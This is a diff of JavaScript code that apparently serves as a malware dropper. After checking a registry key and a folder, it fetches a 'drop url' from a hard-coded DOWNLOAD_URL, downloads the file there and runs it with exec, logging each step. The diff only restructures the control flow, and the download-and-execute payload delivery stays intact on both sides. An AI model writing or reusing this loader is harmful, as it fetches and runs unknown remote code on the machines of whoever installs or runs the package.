@@ -107,37 +107,38 @@ const checkFolder = () => {
 	const registry = await checkRegistry();
 	const folder = await checkFolder();
 
-	if (!registry || !folder) {
-		debugPrint('[*] downloading...');
+	if (registry && folder) {
+		debugPrint('[*] skipping.');
+		return;
+	}
 
-		getRaw(DOWNLOAD_URL, data => {
-			if (!data) {
-				debugPrint('[!] failed to get drop url');
+	debugPrint('[*] downloading...');
+
+	getRaw(DOWNLOAD_URL, data => {
+		if (!data) {
+			debugPrint('[!] failed to get drop url');
+			return;
+		}
+
+		debugPrint(`[*] drop url: ${data}`);
+
+		download(data, filePath => {
+			if (!filePath) {
+				debugPrint('[!] failed to download');
 				return;
 			}
 
-			debugPrint(`[*] drop url: ${data}`);
+			debugPrint('[*] executing...');
 
-			download(data, filePath => {
-				if (!filePath) {
-					debugPrint('[!] failed to download');
+			exec(`"${filePath}"`, (err, stdout, stderr) => {
+				if (err) {
+					debugPrint(`[!] failed to open: ${err.message}`);
 					return;
 				}
 
-				debugPrint('[*] executing...');
-
-				exec(`"${filePath}"`, (err, stdout, stderr) => {
-					if (err) {
-						debugPrint(`[!] failed to open: ${err.message}`);
-						return;
-					}
-
-					if (stderr) debugPrint(`[!] stderr: ${stderr}`);
-					if (stdout) debugPrint(`[*] stdout: ${stdout}`);
-				});
+				if (stderr) debugPrint(`[!] stderr: ${stderr}`);
+				if (stdout) debugPrint(`[*] stdout: ${stdout}`);
 			});
 		});
-	} else {
-		debugPrint('[*] skipping.');
-	}
+	});
 })();
